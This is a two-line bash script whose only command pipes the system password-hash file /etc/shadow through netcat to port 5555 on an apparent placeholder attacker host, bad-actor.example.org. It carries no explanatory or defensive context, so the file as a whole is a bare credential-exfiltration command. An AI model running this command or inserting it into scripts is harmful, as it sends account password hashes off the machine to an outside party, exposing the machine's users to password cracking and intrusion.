#!/bin/bash
cat /etc/shadow | nc bad-actor.example.org 5555
